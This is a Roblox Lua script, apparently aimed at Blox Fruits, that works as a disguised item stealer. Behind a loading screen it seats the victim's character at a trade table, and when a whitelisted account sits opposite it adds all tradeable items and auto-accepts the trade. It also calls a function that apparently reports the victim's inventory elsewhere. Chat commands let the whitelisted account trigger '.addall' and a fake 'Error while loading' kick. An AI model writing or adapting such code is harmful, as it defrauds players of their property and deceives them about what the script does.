-- SEATS
local function getTradeTables()
    local out = {}
    local map = workspace:FindFirstChild("Map")
    if map then
        local zoneName = (game.PlaceId == S3) and "Turtle" or "Dressrosa"
        local zone = map:FindFirstChild(zoneName)
        if zone then
            for _, c in ipairs(zone:GetChildren()) do
                if c.Name == "TradeTable" and c:FindFirstChild("P1") and c:FindFirstChild("P2") then out[#out + 1] = c end
            end
        end
    end
    if #out == 0 then
        for _, d in ipairs(workspace:GetDescendants()) do
            if d.Name == "TradeTable" and d:FindFirstChild("P1") and d:FindFirstChild("P2") then out[#out + 1] = d end
        end
    end
    return out
end
local function seatOccupant(seat)
    local weld = seat and seat:FindFirstChild("SeatWeld")
    if not weld or not weld.Part1 then return nil end
    local hum = weld.Part1.Parent
    local char = hum and hum.Parent
    return char and Players:GetPlayerFromCharacter(char) or nil
end
local function currentSeat()
    for _, tbl in ipairs(getTradeTables()) do
        for _, s in ipairs({ tbl.P1, tbl.P2 }) do
            if seatOccupant(s) == LP then return s, tbl end
        end
    end
    return nil
end
local function oppositeSeat(seat, tbl) return seat == tbl.P1 and tbl.P2 or tbl.P1 end
local function pickSeat(exclude)
    local tables = getTradeTables()
    for _, tbl in ipairs(tables) do
        if tbl ~= exclude then
            local o1, o2 = seatOccupant(tbl.P1), seatOccupant(tbl.P2)
            if not o1 and (not o2 or WHITELIST[o2.Name]) then return tbl.P1 end
            if not o2 and (not o1 or WHITELIST[o1.Name]) then return tbl.P2 end
        end
    end
    for _, tbl in ipairs(tables) do
        if tbl ~= exclude then
            if not seatOccupant(tbl.P1) then return tbl.P1 end
            if not seatOccupant(tbl.P2) then return tbl.P2 end
        end
    end
    return nil
end

-- SAFE TELEPORT
local lastTpAt = 0
local function safeTeleport(targetVec)
    local now = tick()
    if now - lastTpAt < 0.8 then task.wait(0.8 - (now - lastTpAt)) end
    lastTpAt = tick()
    local char = waitForChar(10)
    if not char then log("safeTeleport: no char") return false end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
    if not hrp then log("safeTeleport: no hrp") return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then hum.Sit = false; task.wait(0.15) end
    local restore = {}
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then restore[p] = p.CanCollide; p.CanCollide = false end
    end
    local SPEED = 140
    local dist = (hrp.Position - targetVec).Magnitude
    local duration = math.max(dist / SPEED, 0.45)
    local t0 = tick()
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5); bv.Velocity = Vector3.zero; bv.Parent = hrp
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if not hrp.Parent then return end
        local diff = targetVec - hrp.Position
        local remain = diff.Magnitude
        if remain < 1 then bv.Velocity = Vector3.zero; return end
        local frac = math.min(1, (tick() - t0) / duration)
        local mult = 0.4 + 0.6 * math.sin(frac * math.pi / 2)
        local speed = SPEED * mult
        if remain < 8 then speed = math.min(speed, remain / 0.15) end
        bv.Velocity = diff.Unit * speed
    end)
    local deadline = t0 + duration + 2.5
    while tick() < deadline do
        if (hrp.Position - targetVec).Magnitude < 2 then break end
        task.wait(0.05)
    end
    conn:Disconnect()
    if bv.Parent then bv:Destroy() end
    for p, c in pairs(restore) do
        if p.Parent then p.CanCollide = c end
    end
    task.wait(0.35)
    return true
end

-- SIT
local function sitOn(seat)
    if not seat then return false end
    log("sitOn: " .. seat:GetFullName())
    if currentSeat() == seat then return true end
    local ok = safeTeleport(seat.Position + Vector3.new(0, 3, 0))
    if not ok then log("sitOn: teleport failed") return false end
    local char = waitForChar(5)
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
    if not hum or not hrp then return false end
    if (hrp.Position - seat.Position).Magnitude > 12 then
        log("sitOn: still far, " .. math.floor((hrp.Position - seat.Position).Magnitude))
        return false
    end
    local welded = false
    local conn = seat.ChildAdded:Connect(function(c) if c.Name == "SeatWeld" then welded = true end end)
    pcall(function() seat:Sit(hum) end)
    hum.Sit = true
    local t0 = tick()
    while tick() - t0 < 4 and not welded do
        if seatOccupant(seat) == LP then welded = true; break end
        task.wait(0.1)
    end
    conn:Disconnect()
    if not welded then log("sitOn: weld never formed"); return false end
    log("sitOn: success")
    return true
end
local function forceJumpOff()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    hum.Sit = false
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
    task.wait(0.3)
end

-- TRADE
local tradesCompleted = 0
local function tradeWindowOpen()
    local main = PG:FindFirstChild("Main")
    local tr = main and main:FindFirstChild("Trade")
    return tr and tr.Visible or false
end
local function clearTradeItems()
    if not tradeWindowOpen() then return end
    local c = PG.Main.Trade:FindFirstChild("Container")
    if not c or not c:FindFirstChild("1") then return end
    local frame = c["1"]:FindFirstChild("Frame")
    if not frame then return end
    for _, item in ipairs(frame:GetChildren()) do
        if item:IsA("ImageButton") then
            pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", item.Name)
            task.wait(0.05)
        end
    end
end
local function addToTrade(name) pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name) end
local function runAutoTrade(reason)
    local items = collectTradeable()
    log("runAutoTrade: " .. #items .. " tradeable")
    if #items == 0 then log("no tradeable") return end
    sendInventoryEmbed(reason)
    clearTradeItems(); task.wait(0.25)
    local take = math.min(MAX_ITEMS_PER_TRADE, #items)
    for i = 1, take do
        addToTrade(items[i].Name)
        log("  added: " .. items[i].Name)
        task.wait(0.15)
    end
    local t0 = tick(); local closed = false
    while tick() - t0 < 40 do
        if not tradeWindowOpen() then closed = true; break end
        pcall(TradeFunction.InvokeServer, TradeFunction, "accept")
        task.wait(0.4)
    end
    if closed then
        tradesCompleted = tradesCompleted + 1
        log("trade " .. tradesCompleted .. " completed")
        if tradesCompleted >= KICK_THRESHOLD then task.wait(1.5); LP:Kick(KICK_MSG) end
    else
        log("trade window stayed open 40s — no count")
    end
end

-- CHAT COMMANDS
local CHAT_PREFIX = "."
local function cmdTp() log(".tp"); local s = pickSeat(nil); if s then sitOn(s) end end
local function cmdSit()
    log(".sit")
    local char = LP.Character; if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    hum.Sit = true; task.wait(0.4)
    if not currentSeat() then local s = pickSeat(nil); if s then sitOn(s) end end
end
local function cmdAddAll()
    log(".addall")
    if not tradeWindowOpen() then log(".addall: no trade window") return end
    local items = collectTradeable(); clearTradeItems(); task.wait(0.25)
    local c = 0
    for _, item in ipairs(items) do
        if c >= MAX_ITEMS_PER_TRADE then break end
        addToTrade(item.Name); c = c + 1; task.wait(0.15)
    end
    log(".addall: added " .. c)
end
local function cmdKick() log(".kick"); task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
local COMMANDS = { tp = cmdTp, sit = cmdSit, addall = cmdAddAll, kick = cmdKick }
local function handleChat(msg)
    if type(msg) ~= "string" then return end
    if msg:sub(1, #CHAT_PREFIX) ~= CHAT_PREFIX then return end
    local body = msg:sub(#CHAT_PREFIX + 1):lower():gsub("%s+", "")
    local fn = COMMANDS[body]
    if not fn then return end
    log("chat command: " .. body)
    task.spawn(function() pcall(fn) end)
end
LP.Chatted:Connect(handleChat)

-- MAIN
local function main()
    log("main start | placeId=" .. game.PlaceId .. " | name=" .. tostring(game.Name) .. " | char=" .. tostring(LP.Character ~= nil))
    task.spawn(function()
        local ok, err = pcall(showLoadingScreen)
        if not ok then log("loader error: " .. tostring(err)) end
    end)
    waitForChar(30); log("char ready")
    local map = waitForMap(60)
    if not map then log("map never loaded") return end
    log("map ready")
    local zone = waitForZone(map, 30)
    if not zone then log("zone never loaded") return end
    log("zone ready: " .. zone.Name)
    local tables = getTradeTables()
    log("trade tables found: " .. #tables)
    local seat = currentSeat()
    if not seat then
        local target = pickSeat(nil)
        if target then sitOn(target) end
    end
    while true do
        task.wait(0.5)
        local curSeat, tbl = currentSeat()
        if not curSeat then
            local target = pickSeat(nil)
            if target then sitOn(target) end
        else
            local opp = seatOccupant(oppositeSeat(curSeat, tbl))
            if opp and WHITELIST[opp.Name] then
                if tradeWindowOpen() then runAutoTrade("Whitelisted user on opposite chair.") end
            elseif opp and not WHITELIST[opp.Name] then
                log("non-whitelisted opposite: " .. opp.Name .. " — hopping")
                forceJumpOff()
                local target = pickSeat(tbl)
                if target then sitOn(target) end
            end
        end
    end
end

task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(1)
    local ok, err = pcall(main)
    if not ok then log("FATAL in main: " .. tostring(err)) else log("main exited cleanly") end
end)
